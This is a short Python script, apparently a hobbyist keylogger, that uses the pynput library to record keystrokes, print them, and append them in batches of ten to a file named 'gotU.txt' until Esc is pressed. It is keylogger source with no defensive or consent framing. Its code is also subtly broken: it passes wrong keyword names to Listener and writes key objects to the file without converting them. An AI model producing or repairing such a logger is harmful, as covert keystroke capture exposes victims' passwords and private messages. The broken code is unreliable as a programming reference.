import pynput

from pynput.keyboard import Key, Listener

count = 0 
keys=[]

def k_press(key):
    global keys, count

    keys.append(key)
    count += 1 
    print("{0} pressed".format(key))

    if count >= 10:
        count = 0
        write(keys)
        keys =[]

def k_release(key):
    if key == Key.esc:
        return False

def write(keys):
    with open ('gotU.txt', "a") as f:
        for key in keys:
            f.write(key) 

with Listener(k_press=k_press, k_release=k_release) as listener:
    listener.join()
